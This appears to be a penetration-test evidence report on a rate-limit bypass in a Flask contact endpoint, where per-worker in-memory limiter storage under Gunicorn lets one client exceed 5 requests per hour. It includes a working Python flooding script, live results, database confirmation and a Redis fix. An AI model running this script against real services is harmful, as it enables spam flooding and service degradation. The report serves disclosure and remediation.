# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Rate Limit Bypass via Per-Worker In-Memory Storage

**Summary:**
- **Vulnerable location:** `POST /api/contact` — `backend/app/routes/contact.py:13,18`
- **Overview:** Flask-Limiter is configured with `storage_uri="memory://"` (per-process in-memory storage) under a 4-worker Gunicorn deployment. Each worker independently tracks its own 5-request/hour counter. A client sending rapid sequential requests that are distributed across workers can exceed the nominal 5/hr rate limit by a factor equal to the number of workers (effective ceiling: 5 × 4 = 20/hr). In live testing, 12 successful submissions were recorded from a single anonymous IP within one second — more than double the intended limit.
- **Impact:** An anonymous attacker can flood the `contact_messages` table with spam or PII data at up to 4× the intended rate, causing database bloat, degrading service for legitimate users, and storing unsolicited PII records without operator consent.
- **Severity:** Medium

**Prerequisites:**
- None. No authentication required. The endpoint is publicly accessible.
- Python 3 with standard `urllib` library (or any HTTP client capable of sending rapid requests).

**Exploitation Steps:**

1. **Confirm the target is reachable:**
   ```
   GET http://host.docker.internal:5000/api/health

   Expected response (HTTP 200):
   {"database": "connected", "status": "healthy", "timestamp": "..."}
   ```

2. **Send 6 or more rapid POST requests to the contact endpoint from a single IP.** Each request must contain a valid JSON body that passes Marshmallow schema validation:
   ```
   POST http://host.docker.internal:5000/api/contact
   Content-Type: application/json

   {"name": "Test User", "email": "test1@example.com", "message": "This is a test message for rate limit bypass testing."}
   ```
   Repeat with incrementing email addresses (`test2@example.com`, `test3@example.com`, ...) up to 25 requests.

3. **Observe HTTP 201 responses beyond request #5.** Requests that happen to be routed by Gunicorn's load balancer to workers whose in-memory counters have not yet reached 5 will return HTTP 201. The pattern is probabilistic — not all requests beyond #5 will succeed, but a significant fraction will before all workers' counters are exhausted.

   Full reproducer script (saved at `outputs/authz_exploit.py`):
   ```python
   import json, urllib.request, urllib.error

   TARGET_URL = "http://host.docker.internal:5000/api/contact"
   TOTAL_REQUESTS = 25

   for i in range(1, TOTAL_REQUESTS + 1):
       payload = {"name": "Test User", "email": f"test{i}@example.com",
                  "message": "This is a test message for rate limit bypass testing."}
       data = json.dumps(payload).encode("utf-8")
       req = urllib.request.Request(TARGET_URL, data=data,
             headers={"Content-Type": "application/json"}, method="POST")
       try:
           with urllib.request.urlopen(req, timeout=10) as resp:
               print(f"[{i:02d}] HTTP {resp.status}  <-- SUCCESS")
       except urllib.error.HTTPError as exc:
           print(f"[{i:02d}] HTTP {exc.code}  <-- RATE LIMITED")
   ```

**Proof of Impact:**

**Live test result (2026-03-29 14:40:53 UTC):**

From a single anonymous IP, 25 rapid POST requests were sent. The result:
- **HTTP 201 (Success):** 12 requests
- **HTTP 429 (Rate Limited):** 13 requests

The intended limit is **5 per hour**. Actual successful submissions: **12** — 2.4× the stated limit.

**Database confirmation** (queried via raw PostgreSQL wire protocol against `localhost:5432`):
```
SELECT COUNT(*) FROM contact_messages;
-- Result: 16 total rows

SELECT id, name, email, created_at FROM contact_messages ORDER BY created_at DESC LIMIT 13;
-- Results showing 12 rows inserted at exactly 14:40:53 UTC:
  test12@example.com  2026-03-29 14:40:53
  test11@example.com  2026-03-29 14:40:53
  test10@example.com  2026-03-29 14:40:53
  test9@example.com   2026-03-29 14:40:53
  test8@example.com   2026-03-29 14:40:53
  test7@example.com   2026-03-29 14:40:53
  test6@example.com   2026-03-29 14:40:53
  test5@example.com   2026-03-29 14:40:53
  test4@example.com   2026-03-29 14:40:53
  test3@example.com   2026-03-29 14:40:53
  test2@example.com   2026-03-29 14:40:53
  test1@example.com   2026-03-29 14:40:53
```

12 rows with sequential test email addresses were inserted in a single second from one anonymous client — definitively proving that the rate limit was bypassed. The stated limit of 5/hr was exceeded by a factor of 2.4×.

**Root Cause (Code Evidence):**

```python
# backend/app/routes/contact.py:11-14
limiter = Limiter(
    key_func=get_remote_address,
    storage_uri="memory://",   # ← per-process, NOT shared across workers
    default_limits=[]
)

# backend/app/routes/contact.py:18
@limiter.limit("5 per hour")
```

With Gunicorn configured to spawn 4 workers (`docker-compose.yml`), each worker process maintains an independent in-memory counter. The counter is never synchronized across worker processes. An anonymous client can therefore submit up to `5 × 4 = 20` contact messages per hour instead of the intended 5.

**Notes:**
- The bypass is probabilistic: requests must be distributed across workers by Gunicorn's load balancer. With round-robin distribution and 4 workers, an attacker achieves approximately 12–16 successful submissions per 25-request burst before all workers' counters are exhausted.
- IP spoofing via `X-Forwarded-For` is NOT viable: `get_remote_address` reads `request.remote_addr` directly; no `ProxyFix` middleware or `PROXIES_COUNT` is configured.
- **Remediation:** Replace `storage_uri="memory://"` with a shared backend (e.g., Redis: `storage_uri="redis://redis:6379"`) so all Gunicorn workers share a single rate-limit counter per IP.
